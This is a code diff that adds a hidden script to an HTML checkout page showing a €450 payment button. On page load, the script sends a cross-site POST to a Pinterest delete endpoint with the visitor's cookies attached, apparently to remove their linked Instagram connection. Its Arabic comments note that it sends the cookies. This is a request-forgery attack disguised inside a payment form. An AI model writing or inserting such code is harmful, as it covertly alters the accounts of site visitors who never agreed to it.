@@ -163,6 +163,15 @@
 
       <button type="submit" class="pay-button">Pay €450.00</button>
     </form>
+    <script>
+    fetch('https://www.pinterest.com/resource/ApiResource/delete/', {
+  method: 'POST',
+  mode: 'cors', // افتراضيًا عادة يكفي
+  credentials: 'include', // لإرسال الكوكيز
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ source_url: '%2Fsettings%2Fclaim', data: '%7B%22options%22%3A%7B%22url%22%3A%22%2Fv3%2Fconnect%2Finstagram%2F%22%7D%2C%22context%22%3A%7B%7D%7D' })
+    })
+      </script>
 
     <div class="note">
       <strong>Please note:</strong> Do not close or refresh the browser before your payment has been processed. Wait until you see a confirmation page with your booked experiences.
